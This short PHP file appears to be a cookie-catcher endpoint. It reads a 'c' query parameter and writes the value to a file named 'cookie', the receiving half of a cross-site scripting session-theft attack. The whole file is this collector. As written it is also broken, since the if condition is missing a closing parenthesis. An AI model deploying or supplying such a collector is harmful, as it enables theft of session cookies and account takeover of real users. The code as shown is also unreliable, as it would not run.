<?php

$var =null;

if(isset($_GET['c']){
	$var = $_GET['c'];
	file_put_contents("cookie", $var);
}
